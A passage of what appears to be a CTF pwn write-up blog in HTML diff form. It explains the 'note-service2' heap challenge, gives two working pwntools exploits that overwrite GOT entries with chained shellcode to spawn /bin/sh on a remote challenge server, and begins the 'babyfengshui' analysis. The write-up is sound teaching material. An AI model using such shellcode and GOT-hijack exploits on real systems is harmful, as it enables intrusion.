+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">del</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// ST0C_4</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;index:&quot;</span>);</span><br><span class="line">  v0 = <span class="built_in">read_num</span>();</span><br><span class="line">  <span class="built_in">free</span>((<span class="keyword">void</span> *)qword_2020A0[v0]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>I rename some items in IDA results to simplify understanding process. <code>show</code> and <code>edit</code> are not implemented.</p>
+<h3 id="Analysis-1"><a href="#Analysis-1" class="headerlink" title="Analysis"></a>Analysis</h3><p>As it only has <code>add</code> and <code>del</code> operations, it is unlikely to have <code>UAF</code>. The vulnerability exists in <code>add</code> because index <code>v1</code> is not restricted, so we can write anywhere anything.<br>Given that <code>NX</code> is disabled we can write shellcodes and execute on the heap.</p>
+<p>Our target shellcode should be like:</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span> <span class="built_in">rdi</span>,xxxx    # /bin/sh</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">rax</span>,<span class="number">0x3b</span>    # execve (check <span class="string">`/usr/include/asm/unistd_64.h`</span>)</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">rsi</span>,<span class="number">0</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">rdx</span>,<span class="number">0</span></span><br><span class="line"><span class="keyword">syscall</span></span><br></pre></td></tr></table></figure>
+<p>A problem is: every <code>note</code> size is in [0,8], but shellcode is definitely longer than this, so we have to think about dividing them into small pieces and connecting them as a chain.</p>
+<p>The basic structure of <code>chunks</code> in heap is:</p>
+<table><thead><tr><th>Chunk </th><th>Content</th><th>Length</th></tr></thead><tbody><tr><td rowspan="6">Chunk 0</td><td>prev_size</td><td>0x8 bytes</td></tr><tr><td>size</td><td>0x8 bytes</td></tr><tr><td rowspan="3">Content 0<br>old fd</td><td rowspan="3">0x8 bytes</td></tr><tr></tr><tr></tr><tr><td>old bk</td><td>0x8 bytes</td></tr><tr><td rowspan="6">Chunk 1</td><td>prev_size</td><td>0x8 bytes</td></tr><tr><td>size</td><td>0x8 bytes</td></tr><tr><td rowspan="3">Content 1<br>old fd</td><td rowspan="3">0x8 bytes</td></tr><tr></tr><tr></tr><tr><td>old bk</td><td>0x8 bytes</td></tr><tr><td>Chunk 2</td><td>...</td><td>...</td></tr></tbody></table>
 
-    .avatar {
-      position: absolute;
-      top: 0
-      left: 0;
-      width: $avatarWidth;
-      height: $avatarWidth;
-      padding: 1px;
-      box-sizing: border-box;
-      border: 1px solid var(--border-color);
-      border-radius: 50%;
+<p>However after we write 8 bytes as content to old <code>fd</code>, there is still 8-byte old <code>bk</code> behind, let alone the <code>prev_size</code> and <code>size</code>.<br>We have to use <code>jmp</code> (2 bytes long) for linking shellcode pieces from the former chunk to the next (they are adjacent if allocated in order), and remember the 8th byte is set <code>0</code> by program, so it is about 1+8+8+8&#x3D;25 bytes away:</p>
+<table><thead><tr><th>Chunk </th><th>Content</th><th>Length</th></tr></thead><tbody><tr><td rowspan="6">Chunk 0</td><td>prev_size</td><td>0x8 bytes</td></tr><tr><td>size</td><td>0x8 bytes</td></tr><tr><td>0x5 bytes codes</td><td rowspan="3">0x8 bytes</td></tr><tr><td>0x2 bytes jmp</td></tr><tr><td>0x1 bytes "0"</td></tr><tr><td>old bk</td><td>0x8 bytes</td></tr><tr><td rowspan="6">Chunk 1</td><td>prev_size</td><td>0x8 bytes</td></tr><tr><td>size</td><td>0x8 bytes</td></tr><tr><td>0x5 bytes codes</td><td rowspan="3">0x8 bytes</td></tr><tr><td>0x2 bytes jmp</td></tr><tr><td>0x1 bytes "0"</td></tr><tr><td>old bk</td><td>0x8 bytes</td></tr><tr><td>Chunk 2</td><td>...</td><td>...</td></tr></tbody></table>
 
-      img {
-        border-radius: 50%;
-        width: 100%;
-        height: 100%;
-        background: var(--avatar-background-color);
-      }
+<p>We use <code>jmp short xxx</code> to jump to a target address and the relation between them is: <code>xxx = target_addr - current_addr - 2</code> (calculated from existing cases), so here <code>xxx</code> should be <code>2+1+8+8+8-0-2=25=0x19</code> (<code>jmp short 0x19</code>).</p>
+<p>But <code>add</code> and <code>del</code> can execute codes on the heap neither, so we may need to hijack <code>GOT</code> item. Here I choose to hijack <code>free</code> in <code>GOT</code> because we can trigger it by choosing <code>4. del note</code>.</p>
+<p><code>GOT</code> content:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">.got.plt:0000000000202000                 dq offset stru_201DF8</span><br><span class="line">.got.plt:0000000000202008 qword_202008    dq 0                    ; DATA XREF: sub_880↑r</span><br><span class="line">.got.plt:0000000000202010 qword_202010    dq 0                    ; DATA XREF: sub_880+6↑r</span><br><span class="line">.got.plt:0000000000202018 off_202018      dq offset free          ; DATA XREF: _free↑r</span><br><span class="line">.got.plt:0000000000202020 off_202020      dq offset puts          ; DATA XREF: _puts↑r</span><br><span class="line">.got.plt:0000000000202028 off_202028      dq offset __stack_chk_fail</span><br><span class="line">.got.plt:0000000000202028                                         ; DATA XREF: ___stack_chk_fail↑r</span><br><span class="line">.got.plt:0000000000202030 off_202030      dq offset printf        ; DATA XREF: _printf↑r</span><br><span class="line">.got.plt:0000000000202038 off_202038      dq offset memset        ; DATA XREF: _memset↑r</span><br><span class="line">.got.plt:0000000000202040 off_202040      dq offset read          ; DATA XREF: _read↑r</span><br><span class="line">.got.plt:0000000000202048 off_202048      dq offset __libc_start_main</span><br><span class="line">.got.plt:0000000000202048                                         ; DATA XREF: ___libc_start_main↑r</span><br><span class="line">.got.plt:0000000000202050 off_202050      dq offset malloc        ; DATA XREF: _malloc↑r</span><br><span class="line">.got.plt:0000000000202058 off_202058      dq offset setvbuf       ; DATA XREF: _setvbuf↑r</span><br><span class="line">.got.plt:0000000000202060 off_202060      dq offset atoi          ; DATA XREF: _atoi↑r</span><br><span class="line">.got.plt:0000000000202068 off_202068      dq offset exit          ; DATA XREF: _exit↑r</span><br></pre></td></tr></table></figure>
+<p>The content stores in:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.bss:00000000002020A0 qword_2020A0    dq 0Ch dup(?)           ; DATA XREF: initial+18↑o</span><br></pre></td></tr></table></figure>
+<p>So it is not hard to control index to access <code>GOT</code> items, for example, set index as <code>-(2020A0-202018)/8=-17</code> to access <code>free</code> in <code>GOT</code>. The whole process is like:<br><img src="/imghost/apcaw/hg1.svg" alt="Whole Process"><br>The last thing is to build <code>mov rdi,xxxx    # /bin/sh</code>, we need to input it first, then move it to <code>rdi</code>. Considering we have to use <code>free</code> to trigger shellcodes, if we save <code>/bin/sh</code> in a chunk, before executing <code>free</code> the rdi will saves chunk address, which is also the address of <code>/bin/sh</code>.</p>
+<p>See exploits to check more details.</p>
+<h3 id="Exploit-1"><a href="#Exploit-1" class="headerlink" title="Exploit"></a>Exploit</h3><p>Hijack <code>free</code> in <code>GOT</code>:</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">sh=process(<span class="string">&quot;./note-service2&quot;</span>)</span><br><span class="line">sh=remote(<span class="string">&quot;220.249.52.133&quot;</span>,<span class="number">59324</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;./note-service2&quot;</span>)</span><br><span class="line">free_got=<span class="number">0x0202018</span></span><br><span class="line">content_addr=<span class="number">0x2020A0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">i,content</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;your choice&gt;&gt; &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;index:&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(i))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;size:&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;8&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;content:&quot;</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">i</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;your choice&gt;&gt; &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;index:&quot;</span>)</span><br><span class="line">    sh.send(<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">add((free_got-content_addr)/<span class="number">8</span>,asm(<span class="string">&quot;xor rax,rax&quot;</span>)+<span class="string">&quot;\x90\x90\xEB\x19&quot;</span>)</span><br><span class="line">add(<span class="number">1</span>,asm(<span class="string">&quot;mov eax,0x3b&quot;</span>)+<span class="string">&quot;\xeb\x19&quot;</span>)</span><br><span class="line">add(<span class="number">2</span>,asm(<span class="string">&quot;xor rdx,rdx&quot;</span>)+<span class="string">&#x27;\x90\x90\xEB\x19&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>,asm(<span class="string">&quot;xor rsi,rsi&quot;</span>)+<span class="string">&#x27;\x90\x90\xEB\x19&#x27;</span>)</span><br><span class="line">add(<span class="number">4</span>,asm(<span class="string">&quot;syscall&quot;</span>).ljust(<span class="number">7</span>,<span class="string">&#x27;\x90&#x27;</span>))</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<p>You may find that we use <code>mov eax,0x3b</code> instead of <code>mov rax,0x3b</code>, that is because <code>mov eax,0x3b</code> is 5 bytes long while <code>mov rax,0x3b</code> is 6 bytes long. But we must add a 2 bytes <code>\xEB\x19</code> (<code>jmp short 0x19</code>), so 7 bytes only leave us 5 bytes to write. Therefore <code>xor rax,rax</code> is needed.</p>
+<p>Or we can hijack <code>atoi</code> in <code>GOT</code>, which is a clever way:</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8  </span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">  </span><br><span class="line">sh = process(<span class="string">&#x27;./note-service2&#x27;</span>)  </span><br><span class="line">sh=remote(<span class="string">&quot;220.249.52.133&quot;</span>,<span class="number">59324</span>)</span><br><span class="line">  </span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">index,size,content</span>):</span>  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;your choice&gt;&gt;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;index:&#x27;</span>,<span class="built_in">str</span>(index))  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;size:&#x27;</span>,<span class="built_in">str</span>(size))  </span><br><span class="line">   sh.sendafter(<span class="string">&#x27;content:&#x27;</span>,content)  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span>  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;your choice&gt;&gt;&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;index:&#x27;</span>,<span class="built_in">str</span>(index))  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#rax = 0 jmp short next_chunk  </span></span><br><span class="line">code0 = (asm(<span class="string">&#x27;xor rax,rax&#x27;</span>) + <span class="string">&#x27;\x90\x90\xeb\x19&#x27;</span>)  </span><br><span class="line"><span class="comment">#rax = 0x3B jmp short next_chunk  </span></span><br><span class="line">code1= (asm(<span class="string">&#x27;mov eax,0x3B&#x27;</span>) + <span class="string">&#x27;\xeb\x19&#x27;</span>)  </span><br><span class="line"><span class="comment">#rsi = 0 jmp short next_chunk  </span></span><br><span class="line">code2 = (asm(<span class="string">&#x27;xor rsi,rsi&#x27;</span>) + <span class="string">&#x27;\x90\x90\xeb\x19&#x27;</span>)  </span><br><span class="line"><span class="comment">#rdi = 0 jmp short next_chunk  </span></span><br><span class="line">code3 = (asm(<span class="string">&#x27;xor rdx,rdx&#x27;</span>) + <span class="string">&#x27;\x90\x90\xeb\x19&#x27;</span>)  </span><br><span class="line"><span class="comment">#system call  </span></span><br><span class="line">code4 = (asm(<span class="string">&#x27;syscall&#x27;</span>).ljust(<span class="number">7</span>,<span class="string">&#x27;\x90&#x27;</span>))    </span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;&#x27;&#x27;print len(code0) </span></span><br><span class="line"><span class="string">print len(code1) </span></span><br><span class="line"><span class="string">print len(code2) </span></span><br><span class="line"><span class="string">print len(code3) </span></span><br><span class="line"><span class="string">print len(code4) </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>    </span><br><span class="line">create(<span class="number">0</span>,<span class="number">8</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">7</span>)  </span><br><span class="line">create(<span class="number">1</span>,<span class="number">8</span>,code1)  </span><br><span class="line">create(<span class="number">2</span>,<span class="number">8</span>,code2)  </span><br><span class="line">create(<span class="number">3</span>,<span class="number">8</span>,code3)  </span><br><span class="line">create(<span class="number">4</span>,<span class="number">8</span>,code4)  </span><br><span class="line"><span class="comment"># delete first chunk </span></span><br><span class="line">delete(<span class="number">0</span>)  </span><br><span class="line"><span class="comment"># allocate first chunk and assign it to `atoi` item in `GOT`  </span></span><br><span class="line">create(-<span class="number">8</span>,<span class="number">8</span>,code0)  </span><br><span class="line"><span class="comment"># getshell  </span></span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;your choice&gt;&gt;&#x27;</span>,<span class="string">&#x27;/bin/sh&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">sh.interactive()  </span><br></pre></td></tr></table></figure>
 
-    }
+<h2 id="babyfengshui"><a href="#babyfengshui" class="headerlink" title="babyfengshui"></a>babyfengshui</h2><p>Attachment: <a href="/filehost/apcaw/babyfengshui.gz">babyfengshui.gz</a><br>Description: This shell is super useful! See if you can get the flag! The binary can be found on the server at <code>/home/ctf/</code>.</p>
+<p>This challenge uses the rule of <code>glibc</code> memory releasing and allocation.</p>
+<h3 id="Information-2"><a href="#Information-2" class="headerlink" title="Information"></a>Information</h3><p>Unzip first:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ tar xzvf  babyfengshui.gz</span><br><span class="line">./babyfengshui</span><br><span class="line">./libc.so.6</span><br></pre></td></tr></table></figure>
+<p>Then check:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">$ file babyfengshui</span><br><span class="line">babyfengshui: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=cecdaee24200fe5bbd3d34b30404961ca49067c6, stripped</span><br><span class="line">$ checksec babyfengshui</span><br><span class="line">[*] &#x27;/root/babyfengshui&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">$ ./libc.so.6</span><br><span class="line">GNU C Library (Debian GLIBC 2.19-18+deb8u3) stable release version 2.19, by Roland McGrath et al.</span><br><span class="line">Copyright (C) 2014 Free Software Foundation, Inc.</span><br><span class="line">This is free software; see the source for copying conditions.</span><br><span class="line">There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A</span><br><span class="line">PARTICULAR PURPOSE.</span><br><span class="line">Compiled by GNU CC version 4.8.4.</span><br><span class="line">Compiled on a Linux 3.16.7 system on 2016-02-12.</span><br><span class="line">Available extensions:</span><br><span class="line">        crypt add-on version 2.1 by Michael Glad and others</span><br><span class="line">        GNU Libidn by Simon Josefsson</span><br><span class="line">        Native POSIX Threads Library by Ulrich Drepper et al</span><br><span class="line">        BIND-8.2.3-T5B</span><br><span class="line">libc ABIs: UNIQUE IFUNC</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;http://www.debian.org/Bugs/&gt;.</span><br></pre></td></tr></table></figure>
+<p>Pseudocode:<br><code>main</code>:</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __cdecl __noreturn <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v0; <span class="comment">// [esp+3h] [ebp-15h]</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">size_t</span> v2; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdin, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdout, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;0: Add a user&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1: Delete a user&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2: Display a user&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;3: Update a user description&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;4: Exit&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Action: &quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1) == <span class="number">-1</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !v1 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;size of description: &quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%u%c&quot;</span>, &amp;v2, &amp;v0);</span><br><span class="line">      <span class="built_in">add</span>(v2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;index: &quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v2);</span><br><span class="line">      <span class="built_in"><span class="keyword">delete</span></span>(v2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;index: &quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v2);</span><br><span class="line">      <span class="built_in">display</span>(v2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;index: &quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v2);</span><br><span class="line">      <span class="built_in">update</span>(v2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="number">4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Bye&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( user_index &gt; <span class="number">0x31</span>u )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;maximum capacity exceeded, bye&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>add</code>:</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_DWORD *__cdecl <span class="title">add</span><span class="params">(<span class="keyword">size_t</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *s; <span class="comment">// ST24_4</span></span><br><span class="line">  _DWORD *v2; <span class="comment">// ST28_4</span></span><br><span class="line"></span><br><span class="line">  s = <span class="built_in">malloc</span>(a1);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, a1);</span><br><span class="line">  v2 = <span class="built_in">malloc</span>(<span class="number">0x80</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(v2, <span class="number">0</span>, <span class="number">0x80</span>u);</span><br><span class="line">  *v2 = s;</span><br><span class="line">  ptr[user_index] = v2;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;name: &quot;</span>);</span><br><span class="line">  <span class="built_in">read_name</span>(ptr[user_index] + <span class="number">4</span>, <span class="number">124</span>);</span><br><span class="line">  <span class="built_in">update</span>(++user_index - <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>read_name</code>:</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> __cdecl <span class="title">read_name</span><span class="params">(<span class="keyword">char</span> *a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v3; <span class="comment">// [esp+18h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">fgets</span>(a1, a2, stdin);</span><br><span class="line">  v3 = <span class="built_in">strchr</span>(a1, <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">    *v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>update</code>:</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> __cdecl <span class="title">update</span><span class="params">(<span class="keyword">unsigned</span> __int8 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v2; <span class="comment">// [esp+17h] [ebp-11h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// 